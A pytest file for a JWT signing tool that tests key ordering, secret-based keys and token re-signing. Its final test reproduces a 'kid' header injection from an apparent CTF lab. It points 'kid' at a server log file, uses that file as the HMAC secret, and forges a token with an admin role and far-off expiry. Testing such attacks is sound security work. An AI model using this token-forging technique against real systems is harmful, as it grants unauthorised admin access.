"""Tests for resign workflow, secret key support, sort_keys flag, and kid injection attack."""

from __future__ import annotations

import json

from jwcrypto.jwk import JWK
from pathlib import Path

from yajt.core.codec import base64url_decode, base64url_encode
from yajt.core.normalize import _payload_to_bytes, normalize_header_payload
from yajt.core.sign import sign_compact_jws, resign_token
from yajt.core.parse import parse_compact_jwt
from yajt.keys.jwk import jwk_from_secret
from yajt.workflows.resign import resign_token_string


# ---------- _payload_to_bytes preserves insertion order by default ----------


def test_payload_to_bytes_preserves_order() -> None:
    payload = {"z": 1, "a": 2, "m": 3}
    result = _payload_to_bytes(payload)
    assert result == b'{"z":1,"a":2,"m":3}'


def test_payload_to_bytes_sorts_when_requested() -> None:
    payload = {"z": 1, "a": 2, "m": 3}
    result = _payload_to_bytes(payload, sort_keys=True)
    assert result == b'{"a":2,"m":3,"z":1}'


def test_payload_to_bytes_passthrough_bytes() -> None:
    raw = b"hello"
    assert _payload_to_bytes(raw) is raw


def test_payload_to_bytes_passthrough_string() -> None:
    result = _payload_to_bytes("hello")
    assert result == b"hello"


# ---------- normalize_header_payload ----------


def test_normalize_preserves_payload_order() -> None:
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"iss": "a", "sub": "b", "aud": "c"}
    parts = normalize_header_payload(header, payload)
    decoded_payload = base64url_decode(parts.payload_b64).decode()
    assert decoded_payload == '{"iss":"a","sub":"b","aud":"c"}'


def test_normalize_sorts_payload_when_requested() -> None:
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"iss": "a", "sub": "b", "aud": "c"}
    parts = normalize_header_payload(header, payload, sort_keys=True)
    decoded_payload = base64url_decode(parts.payload_b64).decode()
    assert decoded_payload == '{"aud":"c","iss":"a","sub":"b"}'


def test_normalize_always_sorts_header_keys() -> None:
    header = {"typ": "JWT", "alg": "HS256", "kid": "mykey"}
    payload = {"x": 1}
    parts = normalize_header_payload(header, payload)
    decoded_header = base64url_decode(parts.header_b64).decode()
    assert decoded_header == '{"alg":"HS256","kid":"mykey","typ":"JWT"}'


# ---------- jwk_from_secret ----------


def test_jwk_from_secret_string() -> None:
    key = jwk_from_secret("my-secret")
    assert key.export(as_dict=True)["kty"] == "oct"


def test_jwk_from_secret_bytes() -> None:
    key = jwk_from_secret(b"my-secret")
    assert key.export(as_dict=True)["kty"] == "oct"


def test_jwk_from_secret_signs_verifies() -> None:
    key = jwk_from_secret("test-key")
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"sub": "1234567890"}
    token = sign_compact_jws(header, payload, key, "HS256")
    parts = token.split(".")
    assert len(parts) == 3


# ---------- sign_compact_jws sort_keys ----------


def test_sign_preserves_payload_order() -> None:
    key = jwk_from_secret("k")
    payload = {"z": 1, "a": 2}
    token = sign_compact_jws({"alg": "HS256"}, payload, key, "HS256")
    payload_b64 = token.split(".")[1]
    decoded = base64url_decode(payload_b64).decode()
    assert decoded == '{"z":1,"a":2}'


def test_sign_sorts_payload_when_requested() -> None:
    key = jwk_from_secret("k")
    payload = {"z": 1, "a": 2}
    token = sign_compact_jws({"alg": "HS256"}, payload, key, "HS256", sort_keys=True)
    payload_b64 = token.split(".")[1]
    decoded = base64url_decode(payload_b64).decode()
    assert decoded == '{"a":2,"z":1}'


# ---------- resign_token_string sort_keys ----------


def test_resign_preserves_payload_order() -> None:
    key = jwk_from_secret("k")
    original = sign_compact_jws({"alg": "HS256"}, {"z": 1, "a": 2}, key, "HS256")
    resigned = resign_token_string(original, key, "HS256")
    payload_b64 = resigned.split(".")[1]
    decoded = base64url_decode(payload_b64).decode()
    assert decoded == '{"z":1,"a":2}'


def test_resign_sorts_payload_when_requested() -> None:
    key = jwk_from_secret("k")
    original = sign_compact_jws({"alg": "HS256"}, {"z": 1, "a": 2}, key, "HS256")
    resigned = resign_token_string(original, key, "HS256", sort_keys=True)
    payload_b64 = resigned.split(".")[1]
    decoded = base64url_decode(payload_b64).decode()
    assert decoded == '{"a":2,"z":1}'


# ---------- kid injection attack reproduction ----------


ERROR_LOGS = Path(__file__).resolve().parent.parent / "test_files" / "error.logs"

EXPECTED_TOKEN = (
    "eyJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvaG1yX2xvZ3MvZXJyb3IubG9n"
    "cyIsInR5cCI6IkpXVCJ9."
    "eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwi"
    "aWF0IjoxNzczNjk1OTU5LCJleHAiOjk5OTk5OTk5OTksImRhdGEiOnsidXNlcl9pZCI6MSwiZ"
    "W1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ."
    "9P07yc8km31euQ8-pdt9_qvdYVV2BKv7p9ddxv0knhU"
)


def test_kid_injection_attack_exact_match() -> None:
    """Reproduce the kid injection attack from result.md and verify exact token match."""
    secret = ERROR_LOGS.read_bytes()
    key = jwk_from_secret(secret)

    header = {"typ": "JWT", "alg": "HS256", "kid": "/var/www/html/hmr_logs/error.logs"}
    payload = {
        "iss": "http://hammer.thm",
        "aud": "http://hammer.thm",
        "iat": 1773695959,
        "exp": 9999999999,
        "data": {
            "user_id": 1,
            "email": "tester@hammer.thm",
            "role": "admin",
        },
    }

    token = sign_compact_jws(header, payload, key, "HS256")
    assert token == EXPECTED_TOKEN
